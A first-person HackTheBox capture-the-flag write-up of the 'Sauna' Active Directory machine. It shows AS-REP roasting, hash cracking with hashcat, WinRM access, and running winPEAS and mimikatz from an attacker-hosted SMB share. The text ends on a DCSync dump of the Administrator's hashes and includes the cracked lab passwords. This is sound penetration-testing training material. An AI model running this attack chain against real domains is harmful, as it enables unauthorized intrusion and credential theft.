# Sauna | HackTheBox

### 1. Scan
```bash
kali@kali:~/Desktop/htb$ nmap -A -p- -T4 10.10.10.175
Nmap scan report for 10.10.10.175
Host is up (0.33s latency).
Not shown: 65514 filtered ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Egotistical Bank :: Home
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-07-10 10:08:05Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  msrpc         Microsoft Windows RPC
49686/tcp open  msrpc         Microsoft Windows RPC
61199/tcp open  msrpc         Microsoft Windows RPC
61505/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=7/9%Time=5F07DA73%P=x86_64-pc-linux-gnu%r(DNSVe
SF:rsionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x
SF:04bind\0\0\x10\0\x03");
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h04m52s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-07-10T10:10:35
|_  start_date: N/A

NSE: Script Post-scanning.
Initiating NSE at 23:08
Completed NSE at 23:08, 0.00s elapsed
Initiating NSE at 23:08
Completed NSE at 23:08, 0.00s elapsed
Initiating NSE at 23:08
Completed NSE at 23:08, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7202.51 seconds
```
The machine is running Windows with Active Directory and a web server on port 80. The domain is EGOTISTICAL-BANK.LOCAL.

### 2. Check out the webpage
The web server running on port 80 is hosting a banking website template. I did some dirbusting and got nothing. The template is from W3Layouts, which provides purely static templates with no backend for administration. By finding the template name on the page, we can access an example template page and then use this to compare it with the page hosted by the machine to find what has changed. Most of the pages are the same, except for the site name. However, the "Meet the team" page has been populated with real person names. This allows us to collect the names of possible users which may have accounts on the machine (see users.txt).  
Aside from that, nothing else appears to have been changed from the template, so time to move on.

### 3. Enumerate the Domain
Begin with a namingcontexts search scope to retrieve the domain details.
```bash
kali@kali:/usr/share/doc/python3-impacket/examples$ ldapsearch -h 10.10.10.175 -x -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingcontexts: DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```
RPCclient for the domain SID:
```bash
kali@kali:~/Desktop/htb/sauna$ rpcclient -W '' -U''%'' 10.10.10.175 -c 'lsaquery'
Domain Name: EGOTISTICALBANK
Domain Sid: S-1-5-21-2966785786-3096785034-1186376766
```
Use these details to retrieve some more detailed domain information.
```bash
kali@kali:/usr/share/doc/python3-impacket/examples$ ldapsearch -h 10.10.10.175 -x -b 'DC=EGOTISTICAL-BANK,DC=LOCAL'
# extended LDIF
#
# LDAPv3
# base <DC=EGOTISTICAL-BANK,DC=LOCAL> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# EGOTISTICAL-BANK.LOCAL
dn: DC=EGOTISTICAL-BANK,DC=LOCAL
objectClass: top
objectClass: domain
objectClass: domainDNS
distinguishedName: DC=EGOTISTICAL-BANK,DC=LOCAL
instanceType: 5
whenCreated: 20200123054425.0Z
whenChanged: 20200709225408.0Z
subRefs: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
subRefs: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
subRefs: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
uSNCreated: 4099
dSASignature:: AQAAACgAAAAAAAAAAAAAAAAAAAAAAAAAQL7gs8Yl7ESyuZ/4XESy7A==
uSNChanged: 57366
name: EGOTISTICAL-BANK
objectGUID:: 7AZOUMEioUOTwM9IB/gzYw==
replUpToDateVector:: AgAAAAAAAAADAAAAAAAAAKuM73jRSYVEssLtnGX+r60M4AAAAAAAAA8xG
 BUDAAAA/VqFkkbeXkGqVm5qQCP2DAvQAAAAAAAA0PAKFQMAAABAvuCzxiXsRLK5n/hcRLLsCbAAAA
 AAAADUBFIUAwAAAA==
creationTime: 132388088488934367
forceLogoff: -9223372036854775808
lockoutDuration: -18000000000
lockOutObservationWindow: -18000000000
lockoutThreshold: 0
maxPwdAge: -36288000000000
minPwdAge: -864000000000
minPwdLength: 7
modifiedCountAtLastProm: 0
nextRid: 1000
pwdProperties: 1
pwdHistoryLength: 24
objectSid:: AQQAAAAAAAUVAAAA+o7VsIowlbg+rLZG
serverState: 1
uASCompat: 1
modifiedCount: 1
auditingPolicy:: AAE=
nTMixedDomain: 0
rIDManagerReference: CN=RID Manager$,CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL
fSMORoleOwner: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name
 ,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
systemFlags: -1946157056
wellKnownObjects: B:32:6227F0AF1FC2410D8E3BB10615BB5B0F:CN=NTDS Quotas,DC=EGOT
 ISTICAL-BANK,DC=LOCAL
wellKnownObjects: B:32:F4BE92A4C777485E878E9421D53087DB:CN=Microsoft,CN=Progra
 m Data,DC=EGOTISTICAL-BANK,DC=LOCAL
wellKnownObjects: B:32:09460C08AE1E4A4EA0F64AEE7DAA1E5A:CN=Program Data,DC=EGO
 TISTICAL-BANK,DC=LOCAL
wellKnownObjects: B:32:22B70C67D56E4EFB91E9300FCA3DC1AA:CN=ForeignSecurityPrin
 cipals,DC=EGOTISTICAL-BANK,DC=LOCAL
wellKnownObjects: B:32:18E2EA80684F11D2B9AA00C04F79F805:CN=Deleted Objects,DC=
 EGOTISTICAL-BANK,DC=LOCAL
wellKnownObjects: B:32:2FBAC1870ADE11D297C400C04FD8D5CD:CN=Infrastructure,DC=E
 GOTISTICAL-BANK,DC=LOCAL
wellKnownObjects: B:32:AB8153B7768811D1ADED00C04FD8D5CD:CN=LostAndFound,DC=EGO
 TISTICAL-BANK,DC=LOCAL
wellKnownObjects: B:32:AB1D30F3768811D1ADED00C04FD8D5CD:CN=System,DC=EGOTISTIC
 AL-BANK,DC=LOCAL
wellKnownObjects: B:32:A361B2FFFFD211D1AA4B00C04FD7D83A:OU=Domain Controllers,
 DC=EGOTISTICAL-BANK,DC=LOCAL
wellKnownObjects: B:32:AA312825768811D1ADED00C04FD8D5CD:CN=Computers,DC=EGOTIS
 TICAL-BANK,DC=LOCAL
wellKnownObjects: B:32:A9D1CA15768811D1ADED00C04FD8D5CD:CN=Users,DC=EGOTISTICA
 L-BANK,DC=LOCAL
objectCategory: CN=Domain-DNS,CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,D
 C=LOCAL
isCriticalSystemObject: TRUE
gPLink: [LDAP://CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=Syste
 m,DC=EGOTISTICAL-BANK,DC=LOCAL;0]
dSCorePropagationData: 16010101000000.0Z
otherWellKnownObjects: B:32:683A24E2E8164BD3AF86AC3C2CF3F981:CN=Keys,DC=EGOTIS
 TICAL-BANK,DC=LOCAL
otherWellKnownObjects: B:32:1EB93889E40C45DF9F0C64D23BBB6237:CN=Managed Servic
 e Accounts,DC=EGOTISTICAL-BANK,DC=LOCAL
masteredBy: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN
 =Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
ms-DS-MachineAccountQuota: 10
msDS-Behavior-Version: 7
msDS-PerUserTrustQuota: 1
msDS-AllUsersTrustQuota: 1000
msDS-PerUserTrustTombstonesQuota: 10
msDs-masteredBy: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Na
 me,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
msDS-IsDomainFor: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-N
 ame,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
msDS-NcType: 0
msDS-ExpirePasswordsOnSmartCardOnlyAccounts: TRUE
dc: EGOTISTICAL-BANK

# Users, EGOTISTICAL-BANK.LOCAL
dn: CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL

# Computers, EGOTISTICAL-BANK.LOCAL
dn: CN=Computers,DC=EGOTISTICAL-BANK,DC=LOCAL

# Domain Controllers, EGOTISTICAL-BANK.LOCAL
dn: OU=Domain Controllers,DC=EGOTISTICAL-BANK,DC=LOCAL

# System, EGOTISTICAL-BANK.LOCAL
dn: CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL

# LostAndFound, EGOTISTICAL-BANK.LOCAL
dn: CN=LostAndFound,DC=EGOTISTICAL-BANK,DC=LOCAL

# Infrastructure, EGOTISTICAL-BANK.LOCAL
dn: CN=Infrastructure,DC=EGOTISTICAL-BANK,DC=LOCAL

# ForeignSecurityPrincipals, EGOTISTICAL-BANK.LOCAL
dn: CN=ForeignSecurityPrincipals,DC=EGOTISTICAL-BANK,DC=LOCAL

# Program Data, EGOTISTICAL-BANK.LOCAL
dn: CN=Program Data,DC=EGOTISTICAL-BANK,DC=LOCAL

# NTDS Quotas, EGOTISTICAL-BANK.LOCAL
dn: CN=NTDS Quotas,DC=EGOTISTICAL-BANK,DC=LOCAL

# Managed Service Accounts, EGOTISTICAL-BANK.LOCAL
dn: CN=Managed Service Accounts,DC=EGOTISTICAL-BANK,DC=LOCAL

# Keys, EGOTISTICAL-BANK.LOCAL
dn: CN=Keys,DC=EGOTISTICAL-BANK,DC=LOCAL

# TPM Devices, EGOTISTICAL-BANK.LOCAL
dn: CN=TPM Devices,DC=EGOTISTICAL-BANK,DC=LOCAL

# Builtin, EGOTISTICAL-BANK.LOCAL
dn: CN=Builtin,DC=EGOTISTICAL-BANK,DC=LOCAL

# Hugo Smith, EGOTISTICAL-BANK.LOCAL
dn: CN=Hugo Smith,DC=EGOTISTICAL-BANK,DC=LOCAL

# search reference
ref: ldap://ForestDnsZones.EGOTISTICAL-BANK.LOCAL/DC=ForestDnsZones,DC=EGOTIST
 ICAL-BANK,DC=LOCAL

# search reference
ref: ldap://DomainDnsZones.EGOTISTICAL-BANK.LOCAL/DC=DomainDnsZones,DC=EGOTIST
 ICAL-BANK,DC=LOCAL

# search reference
ref: ldap://EGOTISTICAL-BANK.LOCAL/CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOC
 AL

# search result
search: 2
result: 0 Success

# numResponses: 19
# numEntries: 15
# numReferences: 3
```
This gives a list of domain objects and also some info on the password (minimum length 7).  
Understanding CN, OU, DC: https://stackoverflow.com/questions/18756688/what-are-cn-ou-dc-in-an-ldap-search  
Futile attempt to get AD Users with impacket:
```bash
kali@kali:~/Desktop/htb/sauna$ /usr/share/doc/python3-impacket/examples/GetADUsers.py -all -debug -no-pass -dc-ip 10.10.10.175 'egotistical-bank.local/'
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[+] Impacket Library Installation Path: /home/kali/.local/lib/python2.7/site-packages/impacket
[+] Connecting to 10.10.10.175, port 389, SSL False
[*] Querying 10.10.10.175 for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
[+] Search Filter=(&(sAMAccountName=*)(objectCategory=user))
```
Try getNPUsers.py from impacket. Trying it with simple authentication and no specified users returns nothing. But we can also try it with the gathered possible usernames that were collected from the website before.
```bash
kali@kali:/usr/share/doc/python3-impacket/examples$ /usr/share/doc/python3-impacket/examples/GetNPUsers.py -dc-ip 10.10.10.175 -no-pass -usersfile ~/Desktop/htb/sauna/users.txt 'egotistical-bank.local/'
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:3c53fdc02c13d7071e54869b72df81c6$1ccd408c1a475076f8a082faa0359f3bdf8b0939b839828204963d98bc2a10ef71c41fbe1063db19543ebf76d751afbd538c1d1a7f89c3f6bd3909448d6be1dee30d6e19c3c1c8840e4b29f0d9ea72cc3b39eccfdaeb95d4c0c8c3ef85554e729677a3cd974c2996d46bd190350897ebce815fe721930f6e0490416d5d88a2661807fa272f6bbd1879e760d3a584a911c0fdb59748663f0a2edb48bda6bd8c87e007cd3686e26ba82667fff2326d04100838fc1698551312964d2d1525f0029799e9e2003271e9b3bc8a42a2d0f15b8fa50ce7a4e0160e906869ba0cd28a242aff7335b8863a571f09fc49eb83195522c76c89b2a923486521ccdf1367c52c6c
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
```
This returns a hash, which means a valid user "fsmith" has been found.  
Export the hash in a crackable format for hashcat:
```bash
kali@kali:/usr/share/doc/python3-impacket/examples$ /usr/share/doc/python3-impacket/examples/GetNPUsers.py -dc-ip 10.10.10.175 -no-pass -usersfile ~/Desktop/htb/sauna/users.txt 'egotistical-bank.local/' -format hashcat
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
..
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:5d5341f5b03c798337e1a84caaaac932$c4c45951340e95f9852eeaff229bfae78226afff2a8140d3907e56958b25539bdc52fa54ebd632e3242e4f10e0d9a6adc57d8c01b7ef8bb50960f632ff84d57f56044a4fae453720989343f27b6ae0028766fa59fe5f05d112b1154e7b4457c25f1499cfbfc9b8844af936fbe515af388a49c990a48979c5d75fc1118403cbd64413cd1c50700fd8d9c79996f00799a5e022729fdb14b485ec36289f6dd66c8ea2e714da2953f73dbfe542f1a38d2b2cc69ddc2970f1a026820e3ea703c784f1b1ad309b1fcd04213c4d5cd622de49a2059719337e9deaf5e30bd1a286c299da99d4d5b320872afe98d396b9c5deb772e34f4bf601d2e72e99368d906c0f7868
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
```

### 4. Crack the hash
```bash
kali@kali:~/Desktop/htb/sauna$ hashcat -a 0 -m 18200 fsmith_hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/InsidePro-PasswordsPro.rule --force
hashcat (v6.0.0) starting...

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.
OpenCL API (OpenCL 1.2 pocl 1.5, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i7-7700HQ CPU @ 2.80GHz, 1408/1472 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 3120

Applicable optimizers:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 134 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 44754481200

$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:5d5341f5b03c798337e1a84caaaac932$c4c45951340e95f9852eeaff229bfae78226afff2a8140d3907e56958b25539bdc52fa54ebd632e3242e4f10e0d9a6adc57d8c01b7ef8bb50960f632ff84d57f56044a4fae453720989343f27b6ae0028766fa59fe5f05d112b1154e7b4457c25f1499cfbfc9b8844af936fbe515af388a49c990a48979c5d75fc1118403cbd64413cd1c50700fd8d9c79996f00799a5e022729fdb14b485ec36289f6dd66c8ea2e714da2953f73dbfe542f1a38d2b2cc69ddc2970f1a026820e3ea703c784f1b1ad309b1fcd04213c4d5cd622de49a2059719337e9deaf5e30bd1a286c299da99d4d5b320872afe98d396b9c5deb772e34f4bf601d2e72e99368d906c0f7868:Thestrokes23
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, AS-REP
Hash.Target......: $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:5d5341f...0f7868
Time.Started.....: Thu Jul  9 23:58:16 2020, (30 secs)
Time.Estimated...: Thu Jul  9 23:58:46 2020, (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Mod........: Rules (/usr/share/hashcat/rules/InsidePro-PasswordsPro.rule)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1650.7 kH/s (9.25ms) @ Accel:2 Loops:32 Thr:64 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 48021504/44754481200 (0.11%)
Rejected.........: 0/48021504 (0.00%)
Restore.Point....: 15360/14344385 (0.11%)
Restore.Sub.#1...: Salt:0 Amplifier:160-192 Iteration:0-32
Candidates.#1....: Soybella71 -> Hilfiger84

Started: Thu Jul  9 23:57:45 2020
Stopped: Thu Jul  9 23:58:47 2020
```
We now have some valid user credentials: fsmith:Thestrokes23

### 5. Enumerate with the new account credentials
SMB listing:
```bash
kali@kali:~/Desktop/htb/sauna$ smbclient -L //10.10.10.175 --user=fsmith
Enter WORKGROUP\fsmith's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        print$          Disk      Printer Drivers
        RICOH Aficio SP 8300DN PCL 6 Printer   We cant print money
        SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
```
Crackmapexec share enumeration:
```bash
kali@kali:~/Desktop/htb/sauna$ crackmapexec smb 10.10.10.175 -u fsmith -p Thestrokes23 --shares
SMB         10.10.10.175    445    SAUNA            [*] Windows 10.0 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.175    445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23 
SMB         10.10.10.175    445    SAUNA            [+] Enumerated shares
SMB         10.10.10.175    445    SAUNA            Share           Permissions     Remark
SMB         10.10.10.175    445    SAUNA            -----           -----------     ------
SMB         10.10.10.175    445    SAUNA            ADMIN$                          Remote Admin
SMB         10.10.10.175    445    SAUNA            C$                              Default share
SMB         10.10.10.175    445    SAUNA            IPC$            READ            Remote IPC
SMB         10.10.10.175    445    SAUNA            NETLOGON        READ            Logon server share 
SMB         10.10.10.175    445    SAUNA            print$          READ            Printer Drivers
SMB         10.10.10.175    445    SAUNA            RICOH Aficio SP 8300DN PCL 6    We cant print money
SMB         10.10.10.175    445    SAUNA            SYSVOL          READ            Logon server share
```
Looking back at the nmap scan, port 5985 is open and running an unknown HTTP service. Since this port is traditionally used for WinRM, it is worth checking out. We can confirm it is WinRM using a Metasploit scanner.
```bash
msf5 auxiliary(scanner/winrm/winrm_auth_methods) > run

[+] 10.10.10.175:5985: Negotiate protocol supported
[+] 10.10.10.175:5985: Kerberos protocol supported
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
Now we know it is WinRM, we can attempt to use the credentials we have to login remotely.

### 6. Get a shell
Using evil-winRM, establish a remote connection using the discovered username and password.
```bash
*Evil-WinRM* PS C:\Users\FSmith\Documents> whoami
egotisticalbank\fsmith
*Evil-WinRM* PS C:\Users\FSmith\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\FSmith\Desktop> ls


    Directory: C:\Users\FSmith\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        1/23/2020  10:03 AM             34 user.txt


*Evil-WinRM* PS C:\Users\FSmith\Desktop> cat user.txt
```

### 7. Do enumeration from shell
Enumerating Program Files/Documents/Desktop etc does not turn up anything. However, a viewing of the Users directory shows there is another account that appears to be designated as a service account.
```sh
*Evil-WinRM* PS C:\Program Files (x86)> cd C:\\Users\\
*Evil-WinRM* PS C:\Users> ls


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        1/25/2020   1:05 PM                Administrator
d-----        1/23/2020   9:52 AM                FSmith
d-r---        1/22/2020   9:32 PM                Public
d-----        1/24/2020   4:05 PM                svc_loanmgr
```
Start an SMB server on attack machine:
```bash
kali@kali:/usr/share/doc/python3-impacket/examples$ sudo impacket-smbserver jib1337 /home/kali/Desktop/htb/sauna/share/ -smb2support -user jib1337 -password lol12345
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```
Create a credential object on the victim and mount the share:
```sh
*Evil-WinRM* PS C:\Users\FSmith> $pass = convertto-securestring 'lol12345' -AsPlaintext -Force
*Evil-WinRM* PS C:\Users\FSmith> $cred = New-Object System.Management.Automation.PSCredential('jib1337', $pass)
*Evil-WinRM* PS C:\Users\FSmith> $cred
*Evil-WinRM* PS C:\Users\FSmith> New-PSDrive -Name jib1337 -PSProvider FileSystem -Credential $cred -Root \\10.10.14.173\jib1337

Name           Used (GB)     Free (GB) Provider      Root                                                                                                                                                                                 CurrentLocation
----           ---------     --------- --------      ----                                                                                                                                                                                 ---------------
jib1337                                FileSystem    \\10.10.14.173\jib1337

*Evil-WinRM* PS C:\Users\FSmith> cd jib1337:
*Evil-WinRM* PS jib1337:\> ls


    Directory: \\10.10.14.173\jib1337


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         7/9/2020  10:25 PM         243200 winPEAS.exe


./*Evil-WinRM* PS jib1337:\> ./winPEAS.exe
```
We can now use winPEAS to do some enumeration for a privesc path (see winPEAS.exe). Amongst the huge amount of returned results, we see it has found some autologin credentials.
```sh
[+] Looking for AutoLogon credentials(T1012)
    Some AutoLogon credentials were found!!
    DefaultDomainName             :  35mEGOTISTICALBANK
    DefaultUserName               :  35mEGOTISTICALBANK\svc_loanmanager
    DefaultPassword               :  Moneymakestheworldgoround!
```
Additionally, the tool did not find any antivirus being used. This means we can drop whatever else we want on the machine without worrying about it getting picked up.

### 8. Lateral movement
We can attempt to log in to the service account over WinRM.
```sh
kali@kali:~/Desktop/htb/sauna$ 
kali@kali:~/Desktop/htb/sauna$ evil-winrm -i 10.10.10.175 -u svc_loanmgr -p Moneymakestheworldgoround!

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> whoami
egotisticalbank\svc_loanmgr
```
This succeeds, and we have now accessed the service account.

### 9. Retieve credentials
Enumerating from this, as expected does not provide many leads. However the lack of AV presence on the machine and the fact this is a service account (with possibly better privileges) means we might be able to use Mimikatz.
Copy mimikatz into the share:
```sh
*Evil-WinRM* PS jib1337:\> ls


    Directory: \\10.10.14.173\jib1337


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         7/9/2020  10:25 PM         243200 winPEAS.exe
-a----         7/9/2020  11:05 PM        1263880 mimikatz.exe
```
First I tried running mimikatz normally - it flooded my shell with prompts and broke everything.
After setting back up, I tried running by passing a set of arguments on what I wanted to do. We can dump the SAM file with lsadump.
Reference:
- https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump
```sh
*Evil-WinRM* PS jib1337:\> ./mimikatz.exe "lsadump::dcsync /user:Administrator" "exit"
*Evil-WinRM* PS jib1337:\> ./mimikatz.exe "lsadump::dcsync /user:Administrator" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(commandline) # lsadump::dcsync /user:Administrator
[DC] 'EGOTISTICAL-BANK.LOCAL' will be the domain
[DC] 'SAUNA.EGOTISTICAL-BANK.LOCAL' will be the DC server
[DC] 'Administrator' will be the user account

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 1/24/2020 10:14:15 AM
Object Security ID   : S-1-5-21-2966785786-3096785034-1186376766-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: d9485863c1e9e05851aa40cbb4ab9dff
    ntlm- 0: d9485863c1e9e05851aa40cbb4ab9dff
    ntlm- 1: 7facdc498ed1680c4fd1448319a8c04f
    lm  - 0: ee8c50e6bc332970a8e8a632488f5211

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : caab2b641b39e342e0bdfcd150b1683e

* Primary:Kerberos-Newer-Keys *
    Default Salt : EGOTISTICAL-BANK.LOCALAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 987e26bb845e57df4c7301753f6cb53fcf993e1af692d08fd07de74f041bf031
      aes128_hmac       (4096) : 145e4d0e4a6600b7ec0ece74997651d0
      des_cbc_md5       (4096) : 19d5f15d689b1ce5
    OldCredentials
      aes256_hmac       (4096) : 9637f48fa06f6eea485d26cd297076c5507877df32e4a47497f360106b3c95ef
      aes128_hmac       (4096) : 52c02b864f61f427d6ed0b22639849df
      des_cbc_md5       (4096) : d9379d13f7c15d1c

* Primary:Kerberos *
    Default Salt : EGOTISTICAL-BANK.LOCALAdministrator
    Credentials
      des_cbc_md5       : 19d5f15d689b1ce5
    OldCredentials
      des_cbc_md5       : d9379d13f7c15d1c

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  3fbea1ff422da035f1dc9b0ce45e84ea
    02  708091daa9db25abbd1d94246e4257e2
    03  417f2e40d5be8d436af749ed9fddb0b0
    04  3fbea1ff422da035f1dc9b0ce45e84ea
    05  50cb7cfb64edf83218804d934e30d431
    06  781dbcf7b8f9079382a1948f26f561ee
    07  4052111530264023a7d445957f5146e6
    08  8f4bffc5d94cc294272cd0c836e15c47
    09  0c81bc892ea87f7dd0f4a3a05b51f158
    10  f8c10a5bd37ea2568976d47ef12e55b9
    11  8f4bffc5d94cc294272cd0c836e15c47
    12  023b04503e3eef421de2fcaf8ba1297d
